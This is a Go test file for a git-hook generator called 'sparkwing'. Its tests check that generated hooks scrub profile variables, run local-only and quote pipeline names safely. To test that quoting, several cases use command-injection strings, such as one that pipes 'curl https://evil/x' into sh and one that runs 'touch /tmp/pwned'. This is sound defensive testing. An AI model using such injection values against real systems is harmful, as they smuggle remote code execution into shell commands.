package main

import (
	"os"
	"strings"
	"testing"
)

func TestRenderHookScript_DefaultsManagedRunsToLocalOnly(t *testing.T) {
	script := renderHookScript("pre-commit", []string{"gate"}, false)
	if !strings.Contains(script, "unset SPARKWING_PROFILE") {
		t.Errorf("hook should scrub the ambient profile:\n%s", script)
	}
	if !strings.Contains(script, "SPARKWING_SECRETS_PROFILE") {
		t.Errorf("hook should scrub the independent secrets profile:\n%s", script)
	}
	if !strings.Contains(script, "sparkwing run 'gate' --sw-local-only") {
		t.Errorf("an unpinned hook should stay local:\n%s", script)
	}
	if strings.Contains(script, "--profile") {
		t.Errorf("no --profile was pinned, so none should be passed:\n%s", script)
	}
}

func TestRenderHookScript_QuotesPipelineName(t *testing.T) {
	hostile := `gate; curl https://evil/x | sh #`
	script := renderHookScript("pre-commit", []string{hostile}, false)
	want := "sparkwing run 'gate; curl https://evil/x | sh #' --sw-local-only\n"
	if !strings.Contains(script, want) {
		t.Errorf("pipeline name should be one single-quoted argument:\n%s", script)
	}
}

func TestRenderHookScript_EscapesQuoteInPipelineName(t *testing.T) {
	script := renderHookScript("pre-commit", []string{`a'; touch /tmp/pwned #`}, false)
	want := `sparkwing run 'a'\''; touch /tmp/pwned #' --sw-local-only` + "\n"
	if !strings.Contains(script, want) {
		t.Errorf("an embedded quote should be escaped, not closed:\n%s", script)
	}
}

func TestDescribeManagedHook_RecoversQuotedPipelineNames(t *testing.T) {
	names := []string{"lint", `gate; curl https://evil/x | sh #`, `a'b`}
	script := renderHookScript("pre-commit", names, false)
	got, _ := describeManagedHook(script)
	if len(got) != len(names) {
		t.Fatalf("describeManagedHook = %q, want %d names", got, len(names))
	}
	for i, want := range names {
		if got[i] != want {
			t.Errorf("pipe %d = %q, want %q", i, got[i], want)
		}
	}
}

func TestDescribeManagedHook_ReadsUnquotedLegacyHook(t *testing.T) {
	script := "#!/bin/sh\nsparkwing run lint --profile 'bucket'\n"
	got, _ := describeManagedHook(script)
	if len(got) != 1 || got[0] != "lint" {
		t.Fatalf("describeManagedHook = %q, want [lint]", got)
	}
}

func TestDescribeManagedHook_ReadsLegacyNamesHoldingAQuoteOrBackslash(t *testing.T) {
	cases := []struct{ line, want string }{
		{"sparkwing run it's --profile 'bucket'", "it's"},
		{`sparkwing run a\b --profile 'bucket'`, `a\b`},
	}
	for _, tc := range cases {
		got, _ := describeManagedHook("#!/bin/sh\n" + tc.line + "\n")
		if len(got) != 1 || got[0] != tc.want {
			t.Errorf("describeManagedHook(%q) = %q, want [%s]", tc.line, got, tc.want)
		}
	}
}

func TestRenderHookScript_ForwarderCarriesNoProfile(t *testing.T) {
	script := renderHookScript("prepare-commit-msg", nil, true)
	if strings.Contains(script, "--profile") || strings.Contains(script, "--sw-local-only") {
		t.Errorf("a forwarder should carry no run flags:\n%s", script)
	}
}

func TestRunPipelineForProof_RunsLocalOnly(t *testing.T) {
	t.Setenv("PATH", t.TempDir())
	t.Setenv("SPARKWING_PROFILE", "ambient-profile")
	t.Setenv("SPARKWING_SECRETS_PROFILE", "ambient-secrets")
	repo := t.TempDir()
	cmd, err := pipelineProofCommand(repo, "gate")
	if err != nil {
		t.Fatal(err)
	}
	self, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	if cmd.Path != self || cmd.Err != nil {
		t.Errorf("proof executable = %q (%v), want %q", cmd.Path, cmd.Err, self)
	}
	if got := strings.Join(cmd.Args[1:], " "); got != "run gate --sw-local-only" {
		t.Errorf("proof args = %q, want run gate --sw-local-only", got)
	}
	if cmd.Dir != repo {
		t.Errorf("proof directory = %q, want %q", cmd.Dir, repo)
	}
	for _, value := range cmd.Env {
		if strings.HasPrefix(value, "SPARKWING_PROFILE=") || strings.HasPrefix(value, "SPARKWING_SECRETS_PROFILE=") {
			t.Errorf("proof inherited %q", value)
		}
	}
}
